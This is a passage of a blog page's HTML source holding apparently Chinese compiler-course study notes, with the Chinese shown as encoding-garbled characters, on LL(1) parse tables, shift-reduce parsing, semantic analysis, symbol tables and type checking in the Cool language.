ä¸ºå¯ä»¥Yå¯ä»¥å˜æˆÎµï¼Œæ‰€ä»¥Follow(T)ä¸­çš„å…ƒç´ ä¹Ÿä¼šæ˜¯Follow(int)ä¸­çš„å…ƒç´ </p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722165632093.png" class="" title="image-20200722165632093"><h3 id="LL-1-è§£æè¡¨"><a href="#LL-1-è§£æè¡¨" class="headerlink" title="LL(1)è§£æè¡¨"></a>LL(1)è§£æè¡¨</h3><p>ç›®æ ‡æ˜¯ä¸ºä¸Šä¸‹æ–‡æ— å…³è¯­æ³•Gæ„å»ºå‡ºä¸€ä¸ªè§£æè¡¨T</p><h4 id="è¯­æ³•-è§„åˆ™"><a href="#è¯­æ³•-è§„åˆ™" class="headerlink" title="è¯­æ³•/è§„åˆ™"></a>è¯­æ³•/è§„åˆ™</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722223652295.png" class="" title="image-20200722223652295"><h4 id="ä¾‹å­-1"><a href="#ä¾‹å­-1" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722224646095.png" class="" title="image-20200722224646095"><p>æ ¹æ®å­—æ¯ï¼ˆéç»ˆç»“ç¬¦ï¼‰å’Œç¬¦å·ï¼ˆç»ˆç»“ç¬¦ï¼‰æ¥é¢„æµ‹å’ŒåŒ¹é…å®Œæ•´çš„å¯¹åº”å…³ç³»</p><p>æ„å»ºå®Œè§£æè¡¨çš„æ—¶å€™ï¼Œå¦‚æœè¡¨æ ¼å†…çš„æŸäº›å•å…ƒæ ¼ä¸­æœ‰å¤šç§æ“ä½œçš„è¯ï¼Œæ¯ç§æƒ…å†µä¸‹çš„æ“ä½œå°±ä¸æ˜¯å”¯ä¸€çš„ï¼Œè¿™å°±ä¸æ˜¯LL(1)è¯­æ³•ã€‚</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722225221200.png" class="" title="image-20200722225221200"><h3 id="è‡ªä¸‹è€Œä¸Šçš„è§£æ-Bottom-Up-Parsing"><a href="#è‡ªä¸‹è€Œä¸Šçš„è§£æ-Bottom-Up-Parsing" class="headerlink" title="è‡ªä¸‹è€Œä¸Šçš„è§£æ Bottom-Up Parsing"></a>è‡ªä¸‹è€Œä¸Šçš„è§£æ Bottom-Up Parsing</h3><p>Bottom-Up è§£ææ¯”top-down é€’å½’ä¸‹é™è§£æ æ›´é€šç”¨ï¼Œä¸”åŒæ ·é«˜æ•ˆ</p><p>Bottom-Upæ˜¯å¤§éƒ¨åˆ†è§£æç”Ÿæˆå·¥å…·æ‰€ä½¿ç”¨çš„ä¸€ç§é¦–é€‰æ–¹æ³•</p><ul><li>ä¸éœ€è¦æå–å·¦å› å­è¯­æ³•</li><li>å›å½’åˆ°â€œæ­£å¸¸â€è¯­æ³•ï¼Œä½†ä»ç„¶éœ€è¦å¯¹<strong>+å·</strong>å’Œ<strong>*å·</strong>çš„ä¼˜å…ˆæƒè¿›è¡Œç¼–ç </li><li>ä¸ä¼šå¤„ç†è¯­ä¹‰æ··æ·†çš„è¯­æ³•</li></ul><p>Bottom-Upè§£æ ä¼šè¿›è¡Œå½’çº¦ï¼Œæ—¢é€šè¿‡åè½¬äº§ç”Ÿå¼ï¼Œé€†å‘æ›¿æ¢ï¼Œå°†å­—ç¬¦ä¸²è§„çº¦ä¸ºèµ·å§‹ç¬¦å·</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723094219185.png" class="" title="image-20200723094219185"><p>ä»ä¸‹å¾€ä¸Šçœ‹ï¼Œæ˜¯æœ€å³æ¨å¯¼</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723094508872.png" class="" title="image-20200723094508872"><p>è§£ææ ‘ï¼Œä¹Ÿæ˜¯ä»ä¸‹å¾€ä¸Šç”Ÿæˆçš„</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723094848086.png" class="" title="image-20200723094848086"><h3 id="ç§»ä½è§„çº¦è§£æ-Shift-Reduce-Parsing"><a href="#ç§»ä½è§„çº¦è§£æ-Shift-Reduce-Parsing" class="headerlink" title="ç§»ä½è§„çº¦è§£æ Shift Reduce Parsing"></a>ç§»ä½è§„çº¦è§£æ Shift Reduce Parsing</h3> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723095155240.png" class="" title="image-20200723095155240"><p>åœ¨æ‰§è¡Œè§„çº¦æ“ä½œå‰ï¼Œå§‹ç»ˆå¾—éœ€è¦å¾—åˆ°è¶³å¤Ÿå¤šçš„è¾“å…¥ï¼ˆç§»ä½è¶³å¤Ÿå¤šæ¬¡ï¼‰</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723095718573.png" class="" title="image-20200723095718573"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723095745689.png" class="" title="image-20200723095745689"><ul><li>ç«–çº¿å·¦è¾¹çš„å­—ç¬¦ä¸²èƒ½å¤Ÿç”±ä¸€ä¸ªæ ˆå®ç°ï¼Œæ ˆé¡¶å°±æ˜¯é‚£ä¸ªç«–çº¿çš„ä½ç½®</li><li>Shiftç§»ä½æ“ä½œä¼špushä¸€ä¸ªterminalè¿›å…¥æ ˆ</li><li>è§„çº¦æ“ä½œï¼Œå°†ä¸€äº›ç¬¦å·å¼¹å‡ºæ ˆï¼Œè¿™äº›æ˜¯äº§ç”Ÿå¼å³æ‰‹è¾¹çš„å†…å®¹ã€‚æ¥ç€ä¼šæŠŠä¸€ä¸ªéç»ˆç»“ç¬¦å‹å…¥æ ˆä¸­ï¼Œè¿™æ­Œéç»ˆç»“ç¬¦æ˜¯äº§ç”Ÿå¼å·¦æ‰‹è¾¹çš„å†…å®¹</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723100832481.png" class="" title="image-20200723100832481"><h3 id="å¥æŸ„-Handles"><a href="#å¥æŸ„-Handles" class="headerlink" title="å¥æŸ„ Handles"></a>å¥æŸ„ Handles</h3><p>å¥æŸ„å°±æ˜¯ä¸€ä¸ªè§„çº¦ç‚¹ï¼Œå¯ä»¥å…è®¸è§£æå™¨é€šè¿‡è¿›ä¸€æ­¥çš„è§„çº¦æ“ä½œå›åˆ°å¼€å§‹ç¬¦å·ä½ç½®ã€‚ï¼ˆå¥æŸ„å°±æ˜¯åŒ…å«äº†ä¸€ä¸ªå¯è§„çº¦çš„æ“ä½œè·¯å¾„ï¼‰</p><p>åœ¨shift-reduceè§£æä¸­ï¼Œå¥æŸ„åªä¼šå‡ºç°åœ¨æ ˆé¡¶</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723102541174.png" class="" title="image-20200723102541174"><h3 id="å¥æŸ„è¯†åˆ«"><a href="#å¥æŸ„è¯†åˆ«" class="headerlink" title="å¥æŸ„è¯†åˆ«"></a>å¥æŸ„è¯†åˆ«</h3><p>Lä»£è¡¨ä»å·¦åˆ°å³æ‰«æï¼ŒRä»£è¡¨æœ€å³æ¨å¯¼ï¼ŒKä»£è¡¨äº†éœ€è¦å‘å‰çœ‹kä¸ªæ•°é‡çš„token</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723103946950.png" class="" title="image-20200723103946950"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723104156569.png" class="" title="image-20200723104156569"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723104447205.png" class="" title="image-20200723104447205"><p>å¯¹äºä»»ä½•è¯­æ³•æ¥è¯´ï¼Œå¯è¡Œå‰ç¼€é›†å°±æ˜¯ä¸€ä¸ªæ­£åˆ™è¯­è¨€</p><p>itemæ˜¯æŒ‡ä¸€ä¸ªäº§ç”Ÿå¼å³æ‰‹è¾¹æŸå¤„å­˜åœ¨çš„ä¸€ä¸ªâ€™ . â€˜ï¼Œå¦‚ T -&gt; (E) çš„itemåŒ…å« T -&gt; .(E)  T -&gt; (.E) T -&gt; (E.) T -&gt; (E).</p><p>è€Œ X -&gt; Îµ çš„itemæ˜¯ X -&gt; .</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723105616024.png" class="" title="image-20200723105616024"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723105856274.png" class="" title="image-20200723105856274"><p>â€˜ . â€˜å·¦ä¾§çš„å†…å®¹æ˜¯è§è¿‡çš„ï¼Œå³æ ˆå†…å…ƒç´ ã€‚å³ä¾§å…ƒç´ åˆ™æ˜¯åœ¨è¿›è¡Œè§„çº¦æ“ä½œå‰æƒ³è¦è¯»å–çš„å†…å®¹ã€‚</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723111109950.png" class="" title="image-20200723111109950"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723112430462.png" class="" title="image-20200723112430462"><p>ä»åº•å‘ä¸Šå¼€å§‹å¤„ç†</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723112639904.png" class="" title="image-20200723112639904"><h3 id="è¯†åˆ«å¯è¡Œå‰ç¼€-Recognizing-Viable-Prefixes"><a href="#è¯†åˆ«å¯è¡Œå‰ç¼€-Recognizing-Viable-Prefixes" class="headerlink" title="è¯†åˆ«å¯è¡Œå‰ç¼€ Recognizing Viable Prefixes"></a>è¯†åˆ«å¯è¡Œå‰ç¼€ Recognizing Viable Prefixes</h3><p>ç›®æ ‡æ˜¯å»å†™ä¸€ä¸ªéç¡®å®šæ€§æœ‰é™è‡ªåŠ¨æœºæ¥è¯†åˆ«è§£æå™¨ä¸­æœ‰æ•ˆçš„æ ˆ</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723152951096.png" class="" title="image-20200723152951096"><p>æ„Ÿè§‰æ˜¯æ¨ç®—æ‰€æœ‰çš„å¯èƒ½æ€§</p><h3 id="æœ‰æ•ˆitem-Valid-items"><a href="#æœ‰æ•ˆitem-Valid-items" class="headerlink" title="æœ‰æ•ˆitem Valid items"></a>æœ‰æ•ˆitem Valid items</h3><p>The states of the DFA are â€œcanonical collections of itemsâ€ or â€œcanonical collections of LR(0) itemsâ€</p><h4 id="å®šä¹‰-1"><a href="#å®šä¹‰-1" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723155218728.png" class="" title="image-20200723155218728"><h4 id="ç®€åŒ–åœ°è¯´"><a href="#ç®€åŒ–åœ°è¯´" class="headerlink" title="ç®€åŒ–åœ°è¯´"></a>ç®€åŒ–åœ°è¯´</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723155456565.png" class="" title="image-20200723155456565"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723155514814.png" class="" title="image-20200723155514814"><h2 id="è¯­ä¹‰åˆ†æ-Semantic-Analysis"><a href="#è¯­ä¹‰åˆ†æ-Semantic-Analysis" class="headerlink" title="è¯­ä¹‰åˆ†æ Semantic Analysis"></a>è¯­ä¹‰åˆ†æ Semantic Analysis</h2><h3 id="è¯­ä¹‰åˆ†æç®€ä»‹"><a href="#è¯­ä¹‰åˆ†æç®€ä»‹" class="headerlink" title="è¯­ä¹‰åˆ†æç®€ä»‹"></a>è¯­ä¹‰åˆ†æç®€ä»‹</h3><h4 id="ä¸ºä»€ä¹ˆéœ€è¦å•ç‹¬ä¸€ä¸ªè¯­ä¹‰åˆ†æé˜¶æ®µï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦å•ç‹¬ä¸€ä¸ªè¯­ä¹‰åˆ†æé˜¶æ®µï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦å•ç‹¬ä¸€ä¸ªè¯­ä¹‰åˆ†æé˜¶æ®µï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦å•ç‹¬ä¸€ä¸ªè¯­ä¹‰åˆ†æé˜¶æ®µï¼Ÿ</h4><ul><li>ç¼–ç¨‹è¯­è¨€ä¼šæœ‰ä¸€äº›ç‰¹å¾ï¼Œäººå¯èƒ½ä¼šçŠ¯ä¸€äº›è§£ææ— æ³•æ•è·çš„é”™è¯¯</li><li>ä¸€äº›è¯­è¨€ç»“æ„å¹¶éä¸Šä¸‹æ–‡æ— å…³</li></ul><h4 id="è¯­ä¹‰åˆ†æå®é™…ä¸Šåšä»€ä¹ˆ"><a href="#è¯­ä¹‰åˆ†æå®é™…ä¸Šåšä»€ä¹ˆ" class="headerlink" title="è¯­ä¹‰åˆ†æå®é™…ä¸Šåšä»€ä¹ˆ"></a>è¯­ä¹‰åˆ†æå®é™…ä¸Šåšä»€ä¹ˆ</h4><p>å¦‚coolcçš„æ£€æŸ¥åˆ—è¡¨</p><ol><li>æ‰€æœ‰æ ‡è¯†ç¬¦è¢«å£°æ˜ï¼Œä½œç”¨åŸŸæ˜¯å¦è§„èŒƒ</li><li>ç±»å‹æ£€æŸ¥ï¼ˆä¸»è¦åŠŸèƒ½ï¼‰</li><li>ç»§æ‰¿å…³ç³»æ˜¯å¦æœ‰æ„ä¹‰</li><li>ç±»ä»…å®šä¹‰ä¸€æ¬¡</li><li>ç±»ä¸­æ–¹æ³•ä¹Ÿåªè¢«å®šä¹‰ä¸€æ¬¡</li><li>ä¸æ»¥ç”¨ä¿ç•™çš„å…³é”®å­—æ ‡è¯†ç¬¦</li><li>â€¦â€¦</li></ol><h3 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h3><p>ç›®æ ‡: å°†ç”¨æ³•å’Œå£°æ˜ç›¸åŒ¹é…</p><p>é™æ€åˆ†æåœ¨å¤§å¤šæ•°è¯­è¨€ä¸­éƒ½ç›¸å½“é‡è¦</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723162419518.png" class="" title="image-20200723162419518"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723165607420.png" class="" title="image-20200723165607420"><p>åœ¨ä¸‹é¢ä¾‹å­ä¸­ï¼Œå¯¹äºXå¯èƒ½ä¼šæœ‰æ­§ä¹‰ï¼Œåˆ™ä½¿ç”¨æœ€è¿‘åµŒå¥—è§„åˆ™ most closely nested rule</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723170146809.png" class="" title="image-20200723170146809"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723170623797.png" class="" title="image-20200723170623797"><h3 id="Symbol-Tables"><a href="#Symbol-Tables" class="headerlink" title="Symbol Tables"></a>Symbol Tables</h3><p>åœ¨è®¸å¤šç¼–è¯‘å™¨ä¸­çš„ä¸€ç§é‡è¦çš„æ•°æ®ç»“æ„</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723171535802.png" class="" title="image-20200723171535802"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724094925936.png" class="" title="image-20200724094925936"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724095151576.png" class="" title="image-20200724095151576"><p>ä¼šå…ˆæ‰¾æœ€è¿‘çš„Yï¼ˆä¹Ÿå°±æ˜¯æœ€æ–°å®šä¹‰çš„ï¼‰ </p><p>è€Œåœ¨ä¸‹è¿°é”™è¯¯ç¤ºèŒƒä¸­ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">f</span>(<span class="hljs-attribute">x</span>:INT, <span class="hljs-attribute">x</span>:INT)<br>&#123;&#125;<br></code></pre></td></tr></table></figure><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724095821453.png" class="" title="image-20200724095821453"><p>check_scopeç›´åˆ°xå¤„åœ¨æ ˆé¡¶æ‰è¿”å›true</p><p>å› ä¸ºcoolä¸­å¯ä»¥ï¼Œclassåå…ˆç”¨å†å®šä¹‰ï¼Œæ‰€ä»¥ä¸å¯èƒ½é€šè¿‡symbol tableæˆ–åœ¨ä¸€æ¬¡æ£€æŸ¥ä¸­æ£€æŸ¥å®Œclasså</p><p>è§£å†³åŠæ³•</p><ul><li>ç¬¬ä¸€æ¬¡æ£€æŸ¥ï¼šè®°å½•æ‰€æœ‰çš„classå</li><li>ç¬¬äºŒæ¬¡æ£€æŸ¥ï¼šæ£€æµ‹</li></ul><p>è¯­ä¹‰åˆ†æé€šå¸¸è¦æ±‚å¤šæ¬¡æ£€æŸ¥ï¼Œè€Œä¸”ç»å¸¸å¤§äºä¸¤æ¬¡æ£€æŸ¥ã€‚</p><h3 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724102140619.png" class="" title="image-20200724102140619"><p>ä¸€ç§è¯­è¨€çš„type systemå®šä¹‰äº†å“ªäº›ç±»å‹èƒ½ä½¿ç”¨å“ªäº›æ“ä½œç¬¦ï¼Œç›®æ ‡æ˜¯æ“ä½œç¬¦åªè¢«æ­£ç¡®çš„ç±»å‹ä½¿ç”¨</p><p>ç›®å‰ï¼Œæœ‰ä¸‰ç§ç±»å‹è¯­è¨€ï¼š</p><ul><li>é™æ€ç±»å‹ï¼šç¼–è¯‘çš„æ—¶å€™å°±æ£€æµ‹ç±»å‹</li><li>åŠ¨æ€ç±»å‹ï¼šç›´åˆ°æ‰§è¡Œä»£ç æ‰æ£€æµ‹ç±»å‹</li><li>untypedï¼šæ²¡æœ‰ç±»å‹æ£€æµ‹ï¼ˆæœºå™¨ä»£ç  ï¼‰</li></ul><h4 id="é™æ€ç±»å‹å–åŠ¨æ€ç±»å‹çš„çœ‹æ³•"><a href="#é™æ€ç±»å‹å–åŠ¨æ€ç±»å‹çš„çœ‹æ³•" class="headerlink" title="é™æ€ç±»å‹å–åŠ¨æ€ç±»å‹çš„çœ‹æ³•"></a>é™æ€ç±»å‹å–åŠ¨æ€ç±»å‹çš„çœ‹æ³•</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724103636901.png" class="" title="image-20200724103636901"><h3 id="Type-Checking"><a href="#Type-Checking" class="headerlink" title="Type Checking"></a>Type Checking</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724110021635.png" class="" title="image-20200724110021635"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724110937602.png" class="" title="image-20200724110937602"><h3 id="Type-Environments"><a href="#Type-Environments" class="headerlink" title="Type Environments"></a>Type Environments</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724111334320.png" class="" title="image-20200724111334320"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724111354123.png" class="" title="image-20200724111354123"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724111528046.png" class="" title="image-20200724111528046"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724111731184.png" class="" title="image-20200724111731184"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724112015350.png" class="" title="image-20200724112015350"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724112448369.png" class="" title="image-20200724112448369"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724112420945.png" class="" title="image-20200724112420945"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724112952700.png" class="" title="image-20200724112952700"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724113344525.png" class="" title="image-20200724113344525"><h3 id="Subtyping"><a href="#Subtyping" class="headerlink" title="Subtyping"></a>Subtyping</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724141347149.png" class="" title="image-20200724141347149"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724141650601.png" class="" title="image-20200724141650601"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724142110637.png" class="" title="image-20200724142110637"><h4 id="LUB-or-least-upper-bound"><a href="#LUB-or-least-upper-bound" class="headerlink" title="LUB or least upper bound"></a>LUB or least upper bound</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724142626399.png" class="" title="image-20200724142626399"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724143528841.png" class="" title="image-20200724143528841"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724143822176.png" class="" title="image-20200724143822176"><p>å› ä¸ºä¸çŸ¥é“ä¼šåŒ¹é…ä¸Šå“ªä¸ªç±»å‹ï¼Œæ‰€ä»¥è¦lub(T1,â€¦..Tn)</p><h3 id="Typing-Methods"><a href="#Typing-Methods" class="headerlink" title="Typing Methods"></a>Typing Methods</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724144324764.png" class="" title="image-20200724144324764"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724144914464.png" class="" title="image-20200724144914464"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724145112483.png" class="" title="image-20200724145112483"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724145555997.png" class="" title="image-20200724145555997"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724145757350.png" class="" title="image-20200724145757350"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724150056109.png" class="" title="image-20200724150056109"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724150109672.png" class="" title="image-20200724150109672"><h3 id="Implementing-Type-Checking"><a href="#Implementing-Type-Checking" class="headerlink" title="Implementing Type Checking"></a>Implementing Type Checking</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724151522565.png" class="" title="image-20200724151522565"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724151938870.png" class="" title="image-20200724151938870"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724152341217.png" class="" title="image-20200724152341217"><h3 id="PA4"><a href="#PA4" class="headerlink" title="PA4"></a>PA4</h3><h2 id="Cool-Type-Checking-amp-Runtime-Organization"><a href="#Cool-Type-Checking-amp-Runtime-Organization" class="headerlink" title="Cool Type Checking &amp; Runtime Organization"></a>Cool Type Checking &amp; Runtime Organization</h2><h3 id="Static-vs-Dynamic-Typing"><a href="#Static-vs-Dynamic-Typing" class="headerlink" title="Static vs. Dynamic Typing"></a>Static vs. Dynamic Typing</h3><p>Static type systems detect common errors( at compile time)</p><p><strong>But some correct programs are disallowed</strong></p><ul><li>Some argue for dynamic type checking instead</li><li>Others want more expressive static type checking</li></ul><p>Soundness theorem: for all expressions <strong>E</strong> </p><p><strong>dynamic_type(E)=static_type(E)</strong></p><p><em>In all executions,E evaluates to values of the type inferred by the compiler.</em></p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200803110654648.png" class="" title="image-20200803110654648"><h3 id="Self-Type"><a href="#Self-Type" class="headerlink" title="Self Type"></a>Self Type</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">class</span> <span class="hljs-built_in">Count</span>&#123;<br>i:<span class="hljs-built_in">int</span>-<span class="hljs-number">0</span>; 